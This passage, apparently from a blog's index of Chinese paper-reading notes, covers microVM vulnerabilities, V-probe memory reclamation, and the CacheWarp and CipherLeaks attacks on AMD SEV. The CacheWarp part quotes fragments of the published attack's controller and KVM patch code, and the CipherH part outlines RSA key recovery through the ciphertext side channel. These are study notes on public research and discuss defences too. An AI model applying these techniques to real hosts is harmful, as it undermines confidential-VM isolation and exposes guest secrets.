所以也可以放到cgroup中</p>\n<p>或者直接禁用</p>\n<h2 id=\"traditional-VM\"><a href=\"#traditional-VM\" class=\"headerlink\" title=\"traditional VM\"></a>traditional VM</h2><ul>\n<li>dirty memory dos有效</li>\n<li>nf_conntrack dos有效</li>\n<li>vhost-net 有效</li>\n<li>viriofs提权 有效 9pfs也有效</li>\n<li>PIT 不用了 所以无效</li>\n</ul>\n<p>这些漏洞存在 但是普通VM不一定用 microVM定死了组件 所以一定用</p>\n","categories":["papers"]},{"title":"V-probe","url":"/2024/01/23/papers/V-probe/","content":"<h1 id=\"V-probe\"><a href=\"#V-probe\" class=\"headerlink\" title=\"V-probe\"></a>V-probe</h1><p>ATC23</p>\n<h2 id=\"问题与目标\"><a href=\"#问题与目标\" class=\"headerlink\" title=\"问题与目标\"></a>问题与目标</h2><p>IO直通的DMA操作与memory overcommitment产生冲突</p>\n<p>因为DMA操作需要保证内存是固定不变的  overcommitment需要动态调整</p>\n<p>现有方案：</p>\n<ul>\n<li>IOPF：DMA会产生pagefault，依赖memory reclaim ，swap慢 balloon通信慢 hyperupcall可能回收了DMA缓冲区导致失败</li>\n<li>vIOMMU coIOMMU 让hypervisor 知道VM的DMA信息 兼容性差</li>\n</ul>\n<p>希望</p>\n<ul>\n<li>保证DMA不会失败</li>\n<li>不需要特殊硬件</li>\n<li>不需要修改guest内核</li>\n<li>性能好</li>\n</ul>\n<h2 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>类似hyperupcall 但是用编译好的二进制</p>\n<p>guest启动后动态加载</p>\n<p>限制只能用rdi rax 不允许访问内存 不允许大于64bytes  不能跳转</p>\n<p>关于page：</p>\n<p><a href=\"https://blog.csdn.net/zhoutaopower/article/details/87090982\">Linux 内存管理窥探（5）：page 数据结构_爱洋葱的博客-CSDN博客</a></p>\n<p><a href=\"http://linux.laoqinren.net/kernel/memory-page/\">struct page结构体 - Notes about linux and my work (laoqinren.net)</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/573338379\">linux内核那些事之struct page - 知乎 (zhihu.com)</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_MAPCOUNT_OPS(uname, lname)\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">static __always_inline int Page##uname(struct page *page)\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">&#123;\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\treturn atomic_read(&amp;page-&gt;_mapcount) ==\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t\t\t\tPAGE_##lname##_MAPCOUNT_VALUE;\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">static __always_inline void __SetPage##uname(struct page *page)\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">&#123;\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\tVM_BUG_ON_PAGE(atomic_read(&amp;page-&gt;_mapcount) != -1, page);\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\tatomic_set(&amp;page-&gt;_mapcount, PAGE_##lname##_MAPCOUNT_VALUE);\t\\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">static __always_inline void __ClearPage##uname(struct page *page)\t\\</span></span><br><span class=\"line\"><span class=\"meta\">&#123;\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\tVM_BUG_ON_PAGE(!Page##uname(page), page);\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\tatomic_set(&amp;page-&gt;_mapcount, -1);\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * PageBuddy() indicate that the page is free and in the buddy system</span></span><br><span class=\"line\"><span class=\"comment\"> * (see mm/page_alloc.c).</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_BUDDY_MAPCOUNT_VALUE\t\t(-128)</span></span><br><span class=\"line\">PAGE_MAPCOUNT_OPS(Buddy, BUDDY)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> page_private(page)\t\t((page)-&gt;private)</span></span><br></pre></td></tr></table></figure>\n\n<p>一个用于拿是否free 一个用于拿order</p>\n<p>这些函数的参数都是page结构体的GVA，所以注册函数的同时需要把guest内核page存放的GPA也一同放入</p>\n<p>由于代码在host上执行，不需要GVA-&gt;GPA 所以这段代码不论是GPA-&gt;HVA还是如何翻译 总能在hypervisor上解决</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"> procedure MEMORYRECLAMATION</span><br><span class=\"line\"><span class=\"number\">2</span>: <span class=\"keyword\">for</span> each GFN in GUEST <span class=\"keyword\">do</span></span><br><span class=\"line\"><span class=\"number\">3</span>: <span class=\"keyword\">if</span> GFN is reclaimed then</span><br><span class=\"line\"><span class=\"number\">4</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\"><span class=\"number\">5</span>: SP ← <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> <span class=\"title\">of</span> <span class=\"title\">GFN</span> <span class=\"title\">in</span> <span class=\"title\">GUEST</span></span></span><br><span class=\"line\"><span class=\"class\">6:</span> FREE ← GUEST.PAGE_FREE(SP)</span><br><span class=\"line\"><span class=\"number\">7</span>: ORD ← GUEST.PAGE_ORD(SP)</span><br><span class=\"line\"><span class=\"number\">8</span>: <span class=\"keyword\">if</span> FREE and ORD ≥ MIN_ORD then</span><br><span class=\"line\"><span class=\"number\">9</span>: Lock MUTEX</span><br><span class=\"line\"><span class=\"number\">10</span>: Make the <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> <span class=\"title\">GPA</span> <span class=\"title\">range</span> <span class=\"title\">read</span>-<span class=\"title\">only</span></span></span><br><span class=\"line\"><span class=\"class\">11:</span> SP′ ← <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> <span class=\"title\">of</span> <span class=\"title\">GFN</span> <span class=\"title\">in</span> <span class=\"title\">GUEST</span></span></span><br><span class=\"line\"><span class=\"class\">12:</span> FREE′ ← GUEST.PAGE_FREE(SP′)</span><br><span class=\"line\"><span class=\"number\">13</span>: ORD′ ← GUEST.PAGE_ORD(SP′)</span><br><span class=\"line\"><span class=\"number\">14</span>: <span class=\"keyword\">if</span> FREE′ and ORD′ ≥ MIN_ORD then</span><br><span class=\"line\"><span class=\"number\">15</span>: GFNst ← GFN</span><br><span class=\"line\"><span class=\"number\">16</span>: GFNen ← GFN + (<span class=\"number\">1</span> &lt;&lt; ORD′)</span><br><span class=\"line\"><span class=\"number\">17</span>: RANGE ← [GFNst, GFNen)</span><br><span class=\"line\"><span class=\"number\">18</span>: Unmap EPT in RANGE</span><br><span class=\"line\"><span class=\"number\">19</span>: Unmap IOMMU in RANGE</span><br><span class=\"line\"><span class=\"number\">20</span>: Add RANGE to the reclaimed <span class=\"built_in\">set</span></span><br><span class=\"line\"><span class=\"number\">21</span>: Release reclaimed pages to hypervisor</span><br><span class=\"line\"><span class=\"number\">22</span>: Unlock MUTEX</span><br><span class=\"line\"><span class=\"number\">23</span>: <span class=\"keyword\">return</span> SUCCESS</span><br><span class=\"line\"><span class=\"number\">24</span>: Make the <span class=\"keyword\">struct</span> page GPA range read-write</span><br><span class=\"line\"><span class=\"number\">25</span>: Unlock MUTEX</span><br><span class=\"line\"><span class=\"number\">26</span>: <span class=\"keyword\">return</span> FAIL</span><br></pre></td></tr></table></figure>\n\n<p>记录到reclaimed set中 并且解除映射</p>\n<p>一旦解除映射 对应的物理内存就空出来了 满足overcommitment</p>\n<p>回收代码定时触发或者事件触发</p>\n<p>我认为第21行需要完成两件事</p>\n<ul>\n<li>这里光解除映射 实际上host还是不可用 需要用host kernel的对应函数和数据结构修改  但是已经运行在host上 并且知道guest的所有信息 并不难做到(类似qemu 可用madvise) 但是否有不一致问题？</li>\n<li>修改guest struct page 标记不可用 否则guest当作free仍然分配并使用 可能导致触发大量page fault和VMexit</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"> procedure PAGEFAULTHANDLER</span><br><span class=\"line\"><span class=\"number\">2</span>: Lock MUTEX</span><br><span class=\"line\"><span class=\"number\">3</span>: RANGE ← GetReclaimedRange(GUEST , GPA)</span><br><span class=\"line\"><span class=\"number\">4</span>: PAGES ← pages reallocated <span class=\"keyword\">for</span> RANGE</span><br><span class=\"line\"><span class=\"number\">5</span>: Map RANGE to PAGES in EPT</span><br><span class=\"line\"><span class=\"number\">6</span>: Map RANGE to PAGES in IOMMU</span><br><span class=\"line\"><span class=\"number\">7</span>: Remove RANGE from the reclaimed <span class=\"built_in\">set</span></span><br><span class=\"line\"><span class=\"number\">8</span>: Make the <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> <span class=\"title\">GPA</span> <span class=\"title\">range</span> <span class=\"title\">read</span>-<span class=\"title\">write</span></span></span><br><span class=\"line\"><span class=\"class\">9:</span> Unlock MUTEX</span><br><span class=\"line\"><span class=\"number\">10</span>: <span class=\"keyword\">return</span></span><br><span class=\"line\">Input: GUEST , GPA</span><br><span class=\"line\">Output: RANGE</span><br><span class=\"line\"><span class=\"number\">11</span>: procedure GETRECLAIMEDRANGE</span><br><span class=\"line\"><span class=\"number\">12</span>: <span class=\"keyword\">for</span> each RANGE in the reclaimed <span class=\"built_in\">set</span> of GUEST <span class=\"keyword\">do</span></span><br><span class=\"line\"><span class=\"number\">13</span>: SPst ← the start <span class=\"keyword\">struct</span> page GPA in RANGE</span><br><span class=\"line\"><span class=\"number\">14</span>: SPen ← the end <span class=\"keyword\">struct</span> page GPA in RANGE</span><br><span class=\"line\"><span class=\"number\">15</span>: <span class=\"keyword\">if</span> SPst ≤ GPA ≤ SPen then</span><br><span class=\"line\"><span class=\"number\">16</span>: <span class=\"keyword\">return</span> RANGE</span><br></pre></td></tr></table></figure>\n\n<p>DMA发生page fault 需要重新拿回对应的物理内存</p>\n<p>这时候从reclaimed set中寻找原来的地址判断长度 然后重新映射 保证了DMA用的HPA虽然在动态变化但是仍可用 </p>\n<p>这里的两个函数应该都是加到hypervisor代码中去的(修改host内核)</p>\n<p>普通的page fault和DMA的page fault都使用这个函数</p>\n<p>所以具体实现上仍然需要支持IOPF的硬件  实验中作者是自己修改硬件来支持的</p>\n<h2 id=\"并发\"><a href=\"#并发\" class=\"headerlink\" title=\"并发\"></a>并发</h2><h3 id=\"host与guest\"><a href=\"#host与guest\" class=\"headerlink\" title=\"host与guest\"></a>host与guest</h3><p>把host需要回收的page结构体都改为read only 随后再进行检查 这样做保证了满足要求的page都不会被guest修改</p>\n<h3 id=\"reclaim与page-fault\"><a href=\"#reclaim与page-fault\" class=\"headerlink\" title=\"reclaim与page fault\"></a>reclaim与page fault</h3><p>用host自己的mutex lock</p>\n<h2 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h2><p>这篇文章相当于设备直通场景下的hypercall 因此测试除了常规回收内存之外 还增加了特定的IO测试</p>\n<p>例如tcp udp和redis</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>不管guest怎么操作自己的数据结构 入口一定是在host的</p>\n<p>必须保证host拥有guest数据结构的地址和布局 并且提供给这段代码才可以</p>\n<p>代码其实是修改了host自己的reclaim和page fault逻辑自己执行 不需要VM enter和exit</p>\n<p>这种方式和balloon完全不同 不需要guest自己任何参与 对guest来说 仍然认为自己有着全部内存 不知道二级页表映射已经失效了</p>\n<ul>\n<li>balloon：guest判断free guest标记不可用 host unmap</li>\n<li>v-probe：host判断free (host标记guest不可用) host unmap</li>\n</ul>\n<p>v-probe就算不顺带解决IOPF的问题 从性能上单独来说也是碾压balloon的，因为通过在host访问guest数据结构绕开了virtio这个大框架</p>\n","categories":["papers"]},{"title":"CacheWarp","url":"/2024/05/04/papers/CacheWarp/","content":"<h1 id=\"CacheWarp\"><a href=\"#CacheWarp\" class=\"headerlink\" title=\"CacheWarp\"></a>CacheWarp</h1><p>snp用的是<a href=\"https://github.com/sev-step/sev-step\">sev-step&#x2F;sev-step: This repo tracks a compatible state of all sev step components and contains script to easily install everything required to setup a sev vm (github.com)</a></p>\n<p><a href=\"https://github.com/cispa/CacheWarp/blob/main/kernel-patch/kernel.patch\">CacheWarp&#x2F;kernel-patch&#x2F;kernel.patch at main · cispa&#x2F;CacheWarp (github.com)</a></p>\n<p>SEV_STEP_FLAG_BASE_PFN   sev_step_page_va  和user通信地址</p>\n<p>intr_interception 核心逻辑</p>\n<p><a href=\"https://github.com/cispa/CacheWarp/blob/main/userspace-controller/cachewarp/cachewarp.c\">CacheWarp&#x2F;userspace-controller&#x2F;cachewarp&#x2F;cachewarp.c at main · cispa&#x2F;CacheWarp (github.com)</a></p>\n<p>sev_step_kernel_sync_addr_p 和step框架通信</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">sev_step_kernel_sync_addr_p = libtea_map_physical_address_range(instance, KERNEL_SYNC_PA, <span class=\"number\">4096</span>, PROT_READ | PROT_WRITE, <span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(sev_step_kernel_sync_addr_p, <span class=\"number\">0</span>, <span class=\"number\">4096</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">uint16_t</span> vec[<span class=\"number\">100</span>] = &#123;<span class=\"number\">44</span>, <span class=\"number\">0</span>,<span class=\"number\">8</span>,<span class=\"number\">0x80</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>, <span class=\"number\">8</span>,<span class=\"number\">8</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>, <span class=\"number\">0</span>,<span class=\"number\">0x80</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span> ,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x201</span>, <span class=\"number\">1</span>,<span class=\"number\">0x101</span>,<span class=\"number\">0x101</span>,<span class=\"number\">3</span>,<span class=\"number\">0x11</span>, <span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0x41</span>,<span class=\"number\">0x41</span>,<span class=\"number\">0x5</span>, <span class=\"number\">1</span>,<span class=\"number\">0x11</span>,<span class=\"number\">0x21</span>,<span class=\"number\">0x20</span>,<span class=\"number\">1</span>, <span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>, <span class=\"number\">0x21</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0x3000</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt;= vec[<span class=\"number\">0</span>]; i++)</span><br><span class=\"line\">    <span class=\"keyword\">asm</span> <span class=\"title function_\">volatile</span> <span class=\"params\">(<span class=\"string\">&quot;movw %1, (%0)\\n\\t&quot;</span>:: <span class=\"string\">&quot;r&quot;</span>(sev_step_kernel_sync_addr_p+<span class=\"number\">16</span>+<span class=\"number\">2</span>*i),<span class=\"string\">&quot;r&quot;</span>(vec[i]):)</span>;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>vec攻击向量 和sudo的binary有关</p>\n<p><a href=\"https://github.com/cispa/CacheWarp/tree/main/sudo\">CacheWarp&#x2F;sudo at main · cispa&#x2F;CacheWarp (github.com)</a></p>\n<p>用到libtea 是usenix security22提供的一套框架 不用自己写一大堆难懂的汇编 并且屏蔽掉平台的差异</p>\n<p><a href=\"https://github.com/libtea/frameworks/blob/master/libtea/src/libtea_common.c\">frameworks&#x2F;libtea&#x2F;src&#x2F;libtea_common.c at master · libtea&#x2F;frameworks (github.com)</a></p>\n<p>vec记录了一串数值 是step指令的序列</p>\n<p>vmsa layout 记录在手册中</p>\n<p><a href=\"https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf\">https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf</a></p>\n<p>Table B-4. VMSA Layout, State Save Area for SEV-ES</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">vmsa_paddr = svm-&gt;vmcb-&gt;control.vmsa_pa;</span><br><span class=\"line\"></span><br><span class=\"line\">rsp = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x1d8</span>);</span><br><span class=\"line\">rbp = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x328</span>);</span><br><span class=\"line\">rax = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x1f8</span>);</span><br><span class=\"line\">rcx = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x308</span>);</span><br><span class=\"line\">rdx_rbx = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x310</span>);</span><br><span class=\"line\">rsi_rdi = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x330</span>);</span><br><span class=\"line\">r8_r9   = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x340</span>);</span><br><span class=\"line\">r10_r11 = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x350</span>);</span><br><span class=\"line\">r12_r13 = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x360</span>);</span><br><span class=\"line\">r14_r15 = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x370</span>);</span><br><span class=\"line\">xmm = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x470</span>);</span><br><span class=\"line\">ymm = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x570</span>);</span><br><span class=\"line\">cs  = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x10</span>);</span><br><span class=\"line\">ss  = *(<span class=\"keyword\">volatile</span> u64 *)(vmsa_vaddr+<span class=\"number\">0x20</span>);</span><br><span class=\"line\">reg_vector = ((last_vmsa_rsp != rsp) &lt;&lt; <span class=\"number\">0</span>) + ((last_vmsa_rbp != rbp) &lt;&lt; <span class=\"number\">1</span>) + \\</span><br><span class=\"line\">\t\t\t\t\t\t((last_vmsa_rax != rax) &lt;&lt; <span class=\"number\">2</span>) \t\t   + ((last_vmsa_rcx != rcx) &lt;&lt; <span class=\"number\">3</span>) + \\</span><br><span class=\"line\">\t\t\t\t\t\t((last_vmsa_rdx_rbx != rdx_rbx) &lt;&lt; <span class=\"number\">4</span>)  + ((last_vmsa_rsi_rdi != rsi_rdi) &lt;&lt; <span class=\"number\">5</span>) + \\</span><br><span class=\"line\">\t\t\t\t\t\t((last_vmsa_r8_r9 != r8_r9) &lt;&lt; <span class=\"number\">6</span>) \t   + ((last_vmsa_r10_r11 != r10_r11) &lt;&lt; <span class=\"number\">7</span>) + \\</span><br><span class=\"line\">\t\t\t\t\t\t((last_vmsa_r12_r13 != r12_r13) &lt;&lt; <span class=\"number\">8</span>)  + ((last_vmsa_r14_r15 != r14_r15) &lt;&lt; <span class=\"number\">9</span>) + \\</span><br><span class=\"line\">\t\t\t\t\t\t((last_vmsa_xmm != xmm) &lt;&lt; <span class=\"number\">10</span>) \t\t   + ((last_vmsa_ymm != ymm) &lt;&lt; <span class=\"number\">11</span>) + \\</span><br><span class=\"line\">\t\t\t\t\t\t((last_vmsa_cs != cs) &lt;&lt; <span class=\"number\">12</span>) \t\t   + ((last_vmsa_ss != ss) &lt;&lt; <span class=\"number\">13</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (reg_vector != *((<span class=\"keyword\">volatile</span> u16 *)(sev_step_page_va + PATH_OFFSET + path_index*<span class=\"number\">2</span>))) &#123;</span><br><span class=\"line\">\t\t\t\t\t\tfind_target = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t\t\t\t\tprintk(<span class=\"string\">&quot;dismatch %dth Instr! the vector is 0x%x\\n&quot;</span>, path_index, reg_vector);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n<p>user 先设置flag  kvm把所有页表present bit设为0 guest触发NPF</p>\n<p>kvm拿到gpa 设置APIC</p>\n<p>小于阈值 0step 大于阈值 &gt;&#x3D;1step</p>\n<p>观察RIP看是0还是非0</p>\n<p>snp增加了freshness 寄存器一样密文也会变 可以用sev-step的performance counter</p>\n<p>由于vmsa的cache 导致每次context switch时间不稳定 因此用MTRR标记为不可缓存 并且用wbinvd解决AMD CPU可能stale的问题</p>\n<p>NPF的作用是啥</p>\n<blockquote>\n<p>To ensure consistent conditions for every stepping, the hypervisor always clears the present bit of the last fault page when handling the APIC timer interrupt, i.e., an NPF is always triggered before the next APIC interrupt.  </p>\n</blockquote>\n<p>为了控制变量 保证时间稳定？感觉几乎没有用</p>\n<ol>\n<li>run的汇编每次固定apic timer 可以step</li>\n<li>sev-step没有提到page fault</li>\n</ol>\n<p>是否只是拿个gpa 方便找pattern？</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted, (u32*)(APIC_BASE + APIC_TMICT), apic_interval, wbnoinvd);</span><br><span class=\"line\">SYM_FUNC_START(__svm_sev_es_vcpu_run)</span><br><span class=\"line\">    movl %_ASM_ARG4L, (%_ASM_ARG3)</span><br></pre></td></tr></table></figure>\n\n<p>攻击触发点：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span>* <span class=\"title function_\">ctrl_thread</span><span class=\"params\">(<span class=\"type\">void</span>* dummy)</span> &#123; </span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpin_to_core(ASSIST_CORE);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// hook kvm_exit_handler in the kernel </span></span><br><span class=\"line\">\t<span class=\"keyword\">asm</span> <span class=\"title function_\">volatile</span> <span class=\"params\">(<span class=\"string\">&quot;movq %1, (%0)\\n&quot;</span>::<span class=\"string\">&quot;r&quot;</span>(sev_step_kernel_sync_addr_p),<span class=\"string\">&quot;r&quot;</span>(flag):)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* Wait until the attack finishes */</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (*(<span class=\"type\">uint32_t</span>*)(sev_step_kernel_sync_addr_p)) &#123;sched_yield();&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">intr_interception</span><br><span class=\"line\">    <span class=\"comment\">/* Start */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (zero_stepping_time == <span class=\"number\">0</span> &amp;&amp; non_zero_stepping_time == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        kvm_unpre_all(vcpu-&gt;kvm, svm-&gt;vmcb-&gt;control.asid);</span><br><span class=\"line\">        svm_flush_tlb_current(vcpu);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Mark VMSA into UC will make `VMRUN` updates all vmsa state in cache */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (uc_vmsa) &#123;</span><br><span class=\"line\">            mtrr_uc_page(vmsa_paddr, <span class=\"number\">3</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Avoid to drop smth dirty data and freeze the system</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t * wbnoinvd is enough to make it reliable</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t * wbinvd also works, but it takes longer time</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (invd) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">asm</span> <span class=\"title function_\">volatile</span> <span class=\"params\">(<span class=\"string\">&quot;wbnoinvd\\n\\t&quot;</span>)</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>ssh 怎么利用page fault一起找的？</p>\n<p>npf_interception intr_interception svm_vcpu_enter_exit三者关系是什么？</p>\n<p>exit之后不就是NPF或者INTR 为什么急着先处理？</p>\n","categories":["papers"]},{"title":"CipherH","url":"/2024/05/04/papers/cipherH/","content":"<h1 id=\"CipherH\"><a href=\"#CipherH\" class=\"headerlink\" title=\"CipherH\"></a>CipherH</h1><p><a href=\"https://github.com/Sen-Deng/CipherH/tree/master\">Sen-Deng&#x2F;CipherH at master (github.com)</a></p>\n<blockquote>\n<p>Recent works have illustrated the feasibility of launching ciphertext side-channel attacks against cryptographic libraries using the aforementioned threat model [33]. However, they primarily target manually identified program vulnerabilities. This work presents CIPHERH, a thorough and fully automated framework for identifying such vulnerabilities in production cryptographic libraries.  </p>\n</blockquote>\n<h2 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h2><p><strong>CIPHERLEAKS: Breaking Constant-time Cryptography on AMD SEV via the Ciphertext Side Channel</strong></p>\n<p><strong>A Systematic Look at Ciphertext Side Channels</strong></p>\n<p>VMSA page 物理地址不变  XEX</p>\n<ol>\n<li>建立寄存器密文&lt;-&gt;明文的映射 ：控制OVMF 的一个PEIM  触发NAE VC handler 同时观察rax明文和密文   需要可读</li>\n<li>得到需要攻击的代码页地址：清空所有page 的P bit  NPF的errorcode会知道是否是代码页 再根据寄存器是否变化判断是否是目标代码页</li>\n<li>以Open SSL rsa为例，bn_get_bits5的NPF可以正好从rax读到key的5bit 循环可以得到整个key</li>\n</ol>\n<p>缓解：</p>\n<ol>\n<li>减少会触发NAE导致建立映射的函数 但是治标不治本</li>\n<li>函数返回值rax高位加随机数</li>\n<li>用栈传递返回值或者其他寄存器</li>\n<li>函数不在一个新的page开始</li>\n</ol>\n<p>光防VMSA没用 任意memory都可以观察</p>\n<p>constant time swap可以防一些microarchitecture的side channel攻击 但是防不了比较密文</p>\n<p>例如nginx  先发http请求 触发 然后清空Pbit触发NPF  然后用single-step技术</p>\n<h2 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h2><p>硬件防开销大</p>\n<p>cipherH 软件框架 为了让加密库开发者写完代码以后自己检查一遍</p>\n<blockquote>\n<p>As will be introduced in §5, CIPHERH explores a hybrid approach by using dynamic taint analysis (which is scalable and rapid) to collect functions tainted on an execution trace. Then, it performs static symbolic execution toward each tainted function, covering paths that are not on the dynamic trace.  </p>\n</blockquote>\n<p><strong>设计并不是很难 主要用了两个工具  2.3k代码</strong></p>\n<p>key是taint 访问的过程中 不可以有一块内存可以推断key是否变化 因为都是bit操作 或者n-bit操作 减少了熵</p>\n<ul>\n<li>DFSan  llvm</li>\n<li>angr SSP’16 二进制文件反编译  得到更多的寄存器访存信息  <a href=\"https://trevorsaudi.com/posts/symbolic_execution_angr_part1/\">Symbolic Execution with Angr - part 1 · Trevor Saudi</a></li>\n</ul>\n<p><a href=\"https://www.usenix.org/system/files/conference/ase18/ase18-paper_springer.pdf\">ase18-paper_springer.pdf (usenix.org)</a></p>\n<p><a href=\"https://clang.llvm.org/docs/DataFlowSanitizer.html\">DataFlowSanitizer — Clang 19.0.0git documentation (llvm.org)</a></p>\n<p>编译优化等级开相同  根据函数名可以方便找到对应关系</p>\n<p>但还是有些信息不匹配的  所以第二阶段用保守方法处理</p>\n<h3 id=\"taint-analysis\"><a href=\"#taint-analysis\" class=\"headerlink\" title=\"taint analysis\"></a>taint analysis</h3><p>DFSan需要用他的API加到代码里 然后编译</p>\n<p>追踪数学运算、逻辑、内存访问 包括implicit</p>\n<p>手动识别secret并调API  hook每个函数调用 内存访问</p>\n<p>实际上secret就是RSA的一个私钥  传入最外层的函数之后 之后全可以通过自动分析得到 并不需要对算法库有修改</p>\n<p><a href=\"https://github.com/Sen-Deng/CipherH/blob/master/src/apps/wolfssl_case_study/test.c\">CipherH&#x2F;src&#x2F;apps&#x2F;wolfssl_case_study&#x2F;test.c at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>\n<p>这个阶段输出一系列函数   </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">get_digit_count:3</span><br><span class=\"line\">mp_rand:65</span><br><span class=\"line\">fp_invmod:1</span><br><span class=\"line\">fp_div_2:1</span><br><span class=\"line\">fp_exptmod:1</span><br><span class=\"line\">_fp_exptmod_ct:33</span><br><span class=\"line\">fp_montgomery_reduce:33</span><br><span class=\"line\">wc_RsaUnPad_ex:67</span><br><span class=\"line\">RsaUnPad:67</span><br></pre></td></tr></table></figure>\n\n\n\n<p><a 